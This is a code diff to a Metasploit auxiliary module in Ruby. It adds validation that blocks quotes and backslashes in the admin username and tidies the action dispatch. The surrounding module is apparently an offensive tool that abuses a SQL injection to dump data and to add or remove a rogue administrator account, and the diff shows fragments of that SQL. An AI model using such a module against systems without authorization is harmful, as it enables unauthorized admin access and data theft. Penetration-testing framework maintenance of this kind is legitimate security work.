@@ -125,10 +125,16 @@ class MetasploitModule < Msf::Auxiliary
     end
   end
 
-  def add_user(sqli)
+  def check_admin_username
     if datastore['Admin_Username'].nil?
       fail_with Failure::BadConfig, 'You must specify a username when adding a user'
+    elsif ['\\', '\''].any? { |c| datastore['Admin_Username'].include?(c) }
+      fail_with Failure::BadConfig, 'Admin username cannot contain single quotes or backslashes'
     end
+  end
+
+  def add_user(sqli)
+    check_admin_username
     admin_hash = Digest::MD5.hexdigest(datastore['Admin_Password'] || '')
     user_exists_sql = "select count(1) from usertable where username='#{datastore['Admin_Username']}'"
     # check if user exists, if yes, just change his password
@@ -144,9 +150,7 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def remove_user(sqli)
-    if datastore['Admin_Username'].nil?
-      fail_with Failure::BadConfig, 'You must specify a username when adding a user'
-    end
+    check_admin_username
     sqli.run_sql("delete from usertable where username='#{datastore['Admin_Username']}'")
   end
 
@@ -166,9 +170,12 @@ class MetasploitModule < Msf::Auxiliary
       end
     end
     case action.name
-    when 'SQLI_DUMP' then dump_data(sqli)
-    when 'ADD_ADMIN' then add_user(sqli)
-    when 'REMOVE_ADMIN' then remove_user(sqli)
+    when 'SQLI_DUMP'
+      dump_data(sqli)
+    when 'ADD_ADMIN'
+      add_user(sqli)
+    when 'REMOVE_ADMIN'
+      remove_user(sqli)
     else
       fail_with(Failure::BadConfig, "#{action.name} not defined")
     end
